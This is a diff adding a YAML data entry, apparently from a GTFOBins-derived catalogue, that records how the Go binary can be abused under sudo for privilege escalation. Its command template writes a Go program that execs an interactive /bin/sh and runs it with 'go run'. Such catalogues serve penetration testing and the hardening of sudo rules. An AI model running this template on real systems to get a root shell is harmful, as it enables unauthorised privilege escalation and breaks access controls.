@@ -1,0 +1,27 @@
+id: gtfobins/go/shell/sudo
+type: binary
+platform: linux
+name: go
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'echo -e ''package main\nimport "syscall"\nfunc main(){\n\tsyscall.Exec("/bin/sh", []string{"/bin/sh",
+    "-i"}, []string{})\n}'' >/path/to/temp-file.go
+
+    go run /path/to/temp-file.go'
+references:
+- https://gtfobins.github.io/gtfobins/go/
+tags:
+- linux
+- unix
+- gtfobins
